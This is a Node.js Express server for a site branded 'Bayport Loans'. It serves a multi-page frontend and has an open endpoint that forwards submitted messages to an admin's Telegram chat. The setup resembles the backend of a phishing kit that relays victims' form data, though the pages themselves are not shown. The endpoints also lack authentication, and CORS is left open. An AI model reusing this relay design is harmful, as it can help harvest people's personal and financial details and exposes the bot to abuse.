// server.js
require('dotenv').config();

require('./telegram-bot/bot'); // bot can now use process.env
const express = require('express');
const cors = require('cors');
const path = require('path');
const morgan = require('morgan');
const dotenv = require('dotenv');
const axios = require('axios');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(morgan('dev'));

// Serve frontend static files
app.use(express.static(path.join(__dirname, '../frontend')));

// ==================== API ROUTES ====================

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'OK', message: 'Bayport Loans Backend Running' });
});

// Send message to Telegram
app.post('/api/send-message', async (req, res) => {
    try {
        const { message } = req.body;
        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        const chatId = process.env.ADMIN_CHAT_ID;

        const response = await axios.post(
            `https://api.telegram.org/bot${botToken}/sendMessage`,
            {
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            }
        );

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get updates from Telegram
app.get('/api/get-updates/:offset?', async (req, res) => {
    try {
        const { offset = 0 } = req.params;
        const botToken = process.env.TELEGRAM_BOT_TOKEN;

        const response = await axios.get(
            `https://api.telegram.org/bot${botToken}/getUpdates`,
            { params: { offset, timeout: 30 } }
        );

        res.json({ success: true, data: response.data });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ==================== FRONTEND ROUTES ====================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

app.get('/page2', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/page2.html'));
});

app.get('/page3', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/page3.html'));
});

app.get('/success', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/success.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
});